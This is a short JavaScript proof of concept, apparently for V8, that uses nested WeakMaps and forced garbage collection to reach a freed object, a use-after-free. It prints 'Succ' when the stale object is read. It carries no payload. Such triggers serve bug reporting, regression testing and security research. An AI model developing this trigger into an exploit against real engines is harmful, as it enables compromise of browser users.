var wm = new WeakMap();
var k0 = { k: 0 };

function getUafObject(wm) {
  let innerWm = wm.get(wm.get(k0));
  var s1_wm = wm.get(  // v1
    innerWm.get(
      // v3
      innerWm.get(k0)  // k2
    )[0]);

  let s1_innerWm = s1_wm.get(s1_wm.get(k0));
  return s1_wm.get(
    s1_innerWm.get(
      s1_innerWm.get(k0)
    )[0]);
}


function fml() {
  /* Stage One */
  var s1_wm = new WeakMap();
  var s1_innerWm = new WeakMap();

  var s1_v0 = { s1_v: 0 };

  var s1_k1 = { s1_k: 1 };
  var s1_v1 = [1.5];

  var s1_k2 = { s1_k: 2 };

  var s1_v3 = [s1_k1];

  s1_wm.set(s1_k1, s1_v1);
  s1_wm.set(s1_v0, s1_innerWm);
  s1_wm.set(k0, s1_v0);

  s1_innerWm.set(s1_k2, s1_v3);
  s1_innerWm.set(k0, s1_k2);

  /* Stage Zero */
  var innerWm = new WeakMap();

  var v0 = { v: 0 };
  var k1 = { k: 1 };
  var v1 = s1_wm;

  var k2 = { k: 2 };
  var v3 = [k1];

  wm.set(k1, v1);
  wm.set(v0, innerWm);
  wm.set(k0, v0);

  innerWm.set(k2, v3);
  innerWm.set(k0, k2);
}

for (let i = 0; i < 1000; i++) {
  fml();
	%CollectGarbage(null);

  // Access the UAF object
  var uaf = getUafObject(wm);
  if (uaf[0] != 1.5) {
    console.log('Succ');
  }
}
